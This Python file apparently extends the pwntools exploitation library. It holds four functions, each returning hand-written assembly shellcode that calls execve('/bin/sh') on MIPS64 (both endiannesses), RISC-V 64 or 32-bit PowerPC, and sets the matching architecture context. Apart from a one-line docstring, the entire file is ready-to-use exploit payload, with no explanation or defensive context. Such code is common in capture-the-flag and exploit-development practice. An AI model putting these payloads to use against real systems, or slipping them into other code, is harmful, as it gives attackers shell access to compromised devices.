from pwn import *
'''
Used to complement the generation of shell craft
'''

def mips64_sh():
	context.arch = 'mips64'
	context.endian = 'big'
	context.bits = '64'
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -8($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x2f62
	ori     $t1, $t1, 0x696e
	sw      $t1, -12($sp)
	lui     $t9, 0xd08c
	ori     $t9, $t9, 0x97ff
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0,0x13c1
	syscall 0x40404

	'''
	return shellcode_execve

def mips64el_sh():
	context.arch = 'mips64'
	context.endian = 'little'
	context.bits = '64'
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1, -8($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu   $sp, $sp, -8
	dadd     $a0, $sp, $zero
	lui     $t1, 0x6e69
	ori     $t1, $t1, 0x622f
	sw      $t1,-12($sp)
	lui     $t9, 0xff97
	ori     $t9, $t9, 0x8cd0
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	sw      $zero, -4($sp)
	daddiu   $sp, $sp, -12
	slti    $a1, $zero, -1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	li      $t9, -9
	nor     $a1, $t9, $zero
	dadd     $a1, $sp, $a1
	sd      $a1, -8($sp)
	daddi    $sp, $sp, -8
	dadd     $a1, $sp, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13c1
	syscall 0x40404

	'''
	return shellcode_execve

def riscv64el_sh():
	context.arch = 'riscv'
	context.endian = 'little'
	context.bits = '64'
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	li s1, 0x68732f2f6e69622f
	sd s1, -16(sp)
	sd zero, -8(sp)
	addi a0,sp,-16
	sd a0, -32(sp)
	addi a1,sp,-32
	slt a2,zero,-1 
	li a7, 221
	ecall

	'''
	return shellcode_execve


def powerpc_sh():
	context.arch = 'powerpc'
	context.endian = 'big'
	context.bits = '32'
	shellcode_execve='''
	/* execve(path='/bin/sh', argv=['sh'], envp=0) */
	mr    r31,r1
	xor   r9, r9, r9
	stw   r9, 4(r31)
	stw   r9, 8(r31)
	li    r9, 0x2f62
	sth   r9, 48(r31)
	li    r9, 0x696e
	sth   r9, 50(r31)
	li    r9, 0x2f73
	sth   r9, 52(r31)
	li    r9, 0x6800
	sth   r9, 54(r31)
	addi  r3, r31,0x30
	stwu  r3, 0(r31)
	mr    r4, r31
	xor   r5, r5, r5
	li    r0, 0xb
	sc
	'''
	return shellcode_execve


